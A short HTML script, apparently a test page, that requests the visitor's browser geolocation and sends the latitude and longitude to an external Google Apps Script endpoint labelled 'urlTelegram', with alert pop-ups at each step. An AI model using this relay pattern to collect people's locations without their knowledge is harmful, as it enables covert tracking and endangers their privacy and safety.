<script>

const urlTelegram = "https://script.google.com/macros/s/AKfycbzxbr9GPISobo0xmyhqokBtOTRKYUfLf8EidTQzDHfFmMFUwrv2DYuT2Ltp8hw6-369/exec";

alert("Página carregada!");

if (!navigator.geolocation) {
    alert("Este navegador não suporta localização.");
} else {

    alert("Solicitando localização...");

    navigator.geolocation.getCurrentPosition(

        function(posicao) {

            const latitude = posicao.coords.latitude;
            const longitude = posicao.coords.longitude;

            alert("Latitude: " + latitude);
            alert("Longitude: " + longitude);

            fetch(urlTelegram + "?lat=" + latitude + "&lon=" + longitude)

            .then(response => response.text())

            .then(texto => {
                alert("Resposta do servidor: " + texto);
            })

            .catch(erro => {
                alert("Erro: " + erro);
            });

        },

        function(erro) {

            alert("Erro da localização: " + erro.message);

        }

    );

}

</script>
